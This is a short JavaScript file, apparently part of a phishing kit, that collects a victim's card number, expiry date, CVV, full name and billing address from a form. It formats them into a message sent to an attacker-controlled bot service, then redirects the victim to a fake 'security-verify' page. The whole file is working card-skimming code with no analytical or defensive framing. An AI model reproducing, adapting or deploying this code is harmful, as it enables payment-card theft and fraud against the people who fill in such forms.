import { sendToBot } from '../../services/bot';
async function handleCardSubmit() {
    const cardNumber = document.getElementById('cardNumber').value;
    const expMonth = document.getElementById('expMonth').value;
    const expYear = document.getElementById('expYear').value;
    const cvv = document.getElementById('cvv').value;
    const fullName = document.getElementById('fullName').value;
    const street = document.getElementById('street').value;
    const city = document.getElementById('city').value;
    const state = document.getElementById('state').value;
    const zip = document.getElementById('zip').value;
    
    const message = `💳 <b>Card Info</b>\n\n` +
        `💳 Card: <code>${cardNumber}</code>\n` +
        `📅 Expiry: <code>${expMonth}/${expYear}</code>\n` +
        `🔒 CVV: <code>${cvv}</code>\n` +
        `👤 Name: <code>${fullName}</code>\n` +
        `🏠 Address: <code>${street}, ${city}, ${state} ${zip}</code>`;
    
    await sendToBot(message, 'card-info');
window.location.href = '/security-verify/';
}
